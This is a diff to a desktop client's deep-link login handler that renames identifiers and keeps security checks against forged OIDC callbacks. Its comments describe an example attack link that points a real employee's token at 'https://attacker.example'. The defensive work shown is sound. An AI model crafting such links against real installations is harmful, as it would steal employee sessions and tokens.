@@ -7,7 +7,7 @@ import type { Session } from './server-connector/config.ts'
 // 声明桌面壳转发的深链事件(desktop shell 的 ctx.emit)。
 declare module '@deepseek-ai/cordis' {
   interface Events {
-    'pico/deep-link'(url: string): void
+    'zeokeel/deep-link'(url: string): void
   }
 }
 
@@ -16,11 +16,11 @@ declare module '@deepseek-ai/cordis' {
  *
  * The server OIDC callback redirects the system browser to
  * `<scheme>://auth?token=<t>[&server=<url>&user=<name>]`; the desktop shell
- * forwards it here as the 'pico/deep-link' event. scheme 随渠道包（安装包级），由
+ * forwards it here as the 'zeokeel/deep-link' event. scheme 随渠道包（安装包级），由
  * 桌面壳在组装期注入本插件（见 `installDeepLinkListener` 的说明）：渠道构建用它
  * 自己的 scheme，浏览器确认框里不出现厂商名。We parse it, validate the
  * server URL (https or loopback http), and store the session — the login
- * page's `/api/pico/auth/state` poll then flips to loggedIn and reloads.
+ * page's `/api/zeokeel/auth/state` poll then flips to loggedIn and reloads.
  *
  * Security (srvcore-1,审计 2026-09-13 P0):a deep link is a local OS event
  * that **any** local process or web page can trigger, and the token inside it
@@ -93,7 +93,7 @@ let pendingBrowserLogin: string | null = null
  * (`pendingBrowserLogin`),没有等待目标时一律拒绝。
  *
  * 没接线(本进程没有登录页的嵌入式装配)时保留旧行为:出货装配
- * (`@picoaide/dsh-enterprise` 的 `cordis.patch.yml`)无条件挂载 auth-gate,并在
+ * (`@zeokeel/dsh-enterprise` 的 `cordis.patch.yml`)无条件挂载 auth-gate,并在
  * `apply()` 的第一句调用 `noteLoginPageWired()`,所以真实产品构建恒为严格模式;
  * 这扇门只向"根本没有登录页的嵌入式装配"敞开。
  */
@@ -107,14 +107,14 @@ let loginPageReportsPending = false
  * 登录页下发时的武装被 `configuredServer === ''` 挡掉。于是官方/无预置地址的
  * 构建里,只要员工没点过"使用浏览器登录",`loginPageReportsPending` 恒为 false,
  * 未登录分支只剩 `assertServerURLAllowed`(https 一律放行):任意本机进程用
- * `picoaide://auth?token=…&server=https://attacker.example` 就能把真实员工
+ * `zeokeel://auth?token=…&server=https://attacker.example` 就能把真实员工
  * token 发给攻击者服务端、让攻击者服务端被采纳为会话,且零告警。
  *
  * 修法:「没有预置地址」不再是放行条件。auth-gate 的 `apply()` 无条件调用本函数
  * (有预置地址时同时 `noteBrowserLoginStarted(configuredServer)`);没有预置地址
  * 时 `pendingBrowserLogin` 保持 null ⇒ **未登录且未登记 = 一律拒绝深链**。
  * 密码登录不经过深链,不受影响;OIDC 部署必然先经登录页的 `browserLogin()`
- * 登记(`POST /api/pico/auth/browser-login`),所以也不会被锁死。
+ * 登记(`POST /api/zeokeel/auth/browser-login`),所以也不会被锁死。
  */
 export function noteLoginPageWired(): void {
   loginPageReportsPending = true
@@ -125,7 +125,7 @@ export function noteLoginPageWired(): void {
  * `browserLogin()` 在 `window.open` 之前调用)。
  *
  * 这是 srvcore-1 客户端一半的关键:没有它,任意本机进程(或网页里的自定义
- * scheme 跳转)都能构造 `picoaide://auth?token=…&server=https://attacker.example`,
+ * scheme 跳转)都能构造 `zeokeel://auth?token=…&server=https://attacker.example`,
  * 让客户端把后续会话指向攻击者服务端。传空串 = 清除。
  * @param serverURL - 登录页里用户填写并用于打开 login 地址的服务端。
  */
@@ -148,9 +148,9 @@ export function pendingBrowserLoginServer(): string | null {
 }
 
 /**
- * 应用深链的 host（与 `@picoaide/dsh-wasm-apps-host` 的 `APP_DEEP_LINK_HOST` 同值）。
+ * 应用深链的 host（与 `@zeokeel/dsh-wasm-apps-host` 的 `APP_DEEP_LINK_HOST` 同值）。
  *
- * 为什么这个常量出现在 auth 解析器里：`pico/deep-link` 是**多个监听器共用**的事件，
+ * 为什么这个常量出现在 auth 解析器里：`zeokeel/deep-link` 是**多个监听器共用**的事件，
  * `app` host 属于应用深链（`<渠道 scheme>://app/<app_id>`，契约 §5.3），由
  * wasm-apps-host 的监听器消费。auth 解析器只需要"认出这不是给我的"（见 routeDeepLink），
  * 不需要解析它 —— 所以这里只钉 host 字面值，不复制那边的解析逻辑。
@@ -169,15 +169,15 @@ export type DeepLinkRoute =
 /**
  * 按 **scheme/host** 把一条深链分流给"归谁处理"（P2-4，2026-09-20 本机全功能实测）。
  *
- * 现场：员工点开同事分享的应用链接（`picoaide://app/shared-notes`）时，宿主日志出现
- * `pico-deep-link: ignored malformed deep link` —— 那是 enterprise 的 **auth** 解析器
+ * 现场：员工点开同事分享的应用链接（`zeokeel://app/shared-notes`）时，宿主日志出现
+ * `zeokeel-deep-link: ignored malformed deep link` —— 那是 enterprise 的 **auth** 解析器
  * 按登录回调格式（`<scheme>://auth?token=…`）解析应用深链的正常丢弃。链接本身没坏，
  * 但这条 warn 会把一次正常动作读成"分享链接是坏的"（排障时确实被这么读了）。
  *
  * 分流规则（**应用深链不落 warn**）：
  *  1. 解析不了 ⇒ foreign（`malformed url`）；
  *  2. **自定义 scheme + host=app** ⇒ `app`（本安装的或别家渠道的都算：别家的由
- *     wasm-apps-host 的 `pico/wasm-app-deep-link-foreign` 给用户可读提示）；
+ *     wasm-apps-host 的 `zeokeel/wasm-app-deep-link-foreign` 给用户可读提示）；
  *  3. scheme 不是本安装注入的那个 ⇒ foreign（`not our scheme (scheme=…)`）；
  *  4. host=auth ⇒ `auth`（后面由 `parseAuthDeepLink` 判"有没有 token"）；
  *  5. 其它 host ⇒ foreign（`host=…`）。
@@ -185,7 +185,7 @@ export type DeepLinkRoute =
  * 为什么不把 `http(s)://…/app/…` 也当应用深链：那是网页地址，不会被 OS 当成深链投递；
  * 真收到就说明有人构造了畸形输入，记一条带 reason 的 warn 比静默丢弃更有用。
  *
- * @param raw - 深链原文（`pico/deep-link` 事件的参数）。
+ * @param raw - 深链原文（`zeokeel/deep-link` 事件的参数）。
  * @param scheme - 本安装的深链 scheme（**由桌面壳按渠道注入**；缺省官方值）。
  * @returns 分流结果。
  */
@@ -210,15 +210,15 @@ export function routeDeepLink(raw: string, scheme: string = DEFAULT_DEEP_LINK_SC
 /**
  * Install the deep-link listener; used by SessionService on construction.
  *
- * scheme 由**桌面壳注入**（`picoaide-session` 行 config 的 `deepLinkScheme`，
+ * scheme 由**桌面壳注入**（`zeokeel-session` 行 config 的 `deepLinkScheme`，
  * 见 desktop/src/profile.ts 的 `channelProfilePatches`），不在这里自己读随包
  * `channel.json`：本文件会被 tsdown **内联**进 enterprise 的 lib，而
  * `desktop-channel.ts` 里的路径是相对**它自己**的模块位置算的，于是
- * `../build/channel.json` 会指向 `@picoaide/dsh-enterprise/build/channel.json`
+ * `../build/channel.json` 会指向 `@zeokeel/dsh-enterprise/build/channel.json`
  * —— 那个文件在打包产物里不存在（asar 里只有应用根的 `/build/channel.json`），
  * 结果永远回落官方 scheme，渠道客户端的浏览器 SSO 回调被当成畸形链接丢掉
  * （2026-09-11 真机复现）。
- * @param ctx - Host context (carries the `pico/deep-link` event).
+ * @param ctx - Host context (carries the `zeokeel/deep-link` event).
  * @param applySession - store a verified session.
  * @param getCurrent - current session (cross-server switch guard).
  * @param scheme - 本安装的深链 scheme（缺省官方值）。
@@ -229,7 +229,7 @@ export function installDeepLinkListener(
   getCurrent?: () => Session | null,
   scheme: string = DEFAULT_DEEP_LINK_SCHEME,
 ): () => void {
-  return ctx.on('pico/deep-link', (url: unknown) => {
+  return ctx.on('zeokeel/deep-link', (url: unknown) => {
     if (typeof url !== 'string') return
     const session = parseAuthDeepLink(url, scheme)
     if (session === null) {
@@ -240,25 +240,25 @@ export function installDeepLinkListener(
       // 其余情况保留 warn（可能是真的配错 scheme / 写错的回调），但把**可判别的原因**
       // 附上：host=auth 无 token 与"不是登录回调"是两件事，排障时不该靠猜。
       ctx.logger?.warn(route.kind === 'auth'
-        ? 'pico-deep-link: ignored malformed deep link (host=auth without token)'
-        : `pico-deep-link: ignored malformed deep link (not an auth callback: ${route.reason})`)
+        ? 'zeokeel-deep-link: ignored malformed deep link (host=auth without token)'
+        : `zeokeel-deep-link: ignored malformed deep link (not an auth callback: ${route.reason})`)
       return
     }
     // The link may omit server/user (older server or manual invocation):
     // without a server the token cannot be attached to any gateway.
     if (session.serverURL === '' || session.username === '') {
-      ctx.logger?.warn('pico-deep-link: ignored link without server/user')
+      ctx.logger?.warn('zeokeel-deep-link: ignored link without server/user')
       return
     }
     try {
       assertServerURLAllowed(session.serverURL)
     } catch (error) {
-      ctx.logger?.warn(`pico-deep-link: rejected unsafe server: ${error instanceof AuthError ? error.message : String(error)}`)
+      ctx.logger?.warn(`zeokeel-deep-link: rejected unsafe server: ${error instanceof AuthError ? error.message : String(error)}`)
       return
     }
     const identity = serverIdentity(session.serverURL)
     if (identity === null) {
-      ctx.logger?.warn('pico-deep-link: ignored unparsable server')
+      ctx.logger?.warn('zeokeel-deep-link: ignored unparsable server')
       return
     }
     // ---- 判定必须在任何网络请求之前(srvcore-1) ----
@@ -268,7 +268,7 @@ export function installDeepLinkListener(
     const existing = getCurrent?.() ?? null
     if (existing !== null) {
       if (serverIdentity(existing.serverURL) !== identity) {
-        ctx.logger?.warn(`pico-deep-link: refused server switch while signed in; sign out first (${JSON.stringify(session.serverURL)})`)
+        ctx.logger?.warn(`zeokeel-deep-link: refused server switch while signed in; sign out first (${JSON.stringify(session.serverURL)})`)
         return
       }
     } else if (loginPageReportsPending && pendingBrowserLogin !== identity) {
@@ -277,7 +277,7 @@ export function installDeepLinkListener(
       // 接线后 `pendingBrowserLogin === null`(官方构建没有预置地址、用户也
       // 没点过浏览器登录)同样走这里 —— "没有等待目标"是拒绝理由,不是放行
       // 理由(R3-N1a:官方构建上这条守卫曾经整体是死的)。
-      ctx.logger?.warn(`pico-deep-link: refused server no local login is waiting for (${JSON.stringify(session.serverURL)})`)
+      ctx.logger?.warn(`zeokeel-deep-link: refused server no local login is waiting for (${JSON.stringify(session.serverURL)})`)
       return
     }
     // 安全:深链 token 先对目标网关预验证(/auth/me 带 token 探通),避免
@@ -289,15 +289,15 @@ export function installDeepLinkListener(
       } catch (error) {
         // 日志消毒:serverURL/username 来自链接参数(攻击者可控),
         // JSON.stringify 剥离换行/控制符,防日志注入(2026-09-01 审计)。
-        ctx.logger?.warn(`pico-deep-link: token rejected by ${JSON.stringify(session.serverURL)}: ${error instanceof Error ? error.message : String(error)}`)
+        ctx.logger?.warn(`zeokeel-deep-link: token rejected by ${JSON.stringify(session.serverURL)}: ${error instanceof Error ? error.message : String(error)}`)
         return
       }
-      ctx.logger?.info(`pico-deep-link: logged in as ${JSON.stringify(session.username)}`)
+      ctx.logger?.info(`zeokeel-deep-link: logged in as ${JSON.stringify(session.username)}`)
       // R15B-04：同服务端换账号在这里是放行的（与 login 路由同一口径），但必须
       // 留下"换了人"的信号 —— 注入应用页的看门狗按同一个身份判据把已加载的页面
       // 重载掉，旧账号的渲染状态不会活到新账号的令牌下。
       if (sessionIdentityChanged(getCurrent?.() ?? null, session)) {
-        ctx.logger?.warn('pico-deep-link: session identity changed on this server; the loaded app page will reload (the previous account render state must not survive)')
+        ctx.logger?.warn('zeokeel-deep-link: session identity changed on this server; the loaded app page will reload (the previous account render state must not survive)')
       }
       applySession(session)
     })()
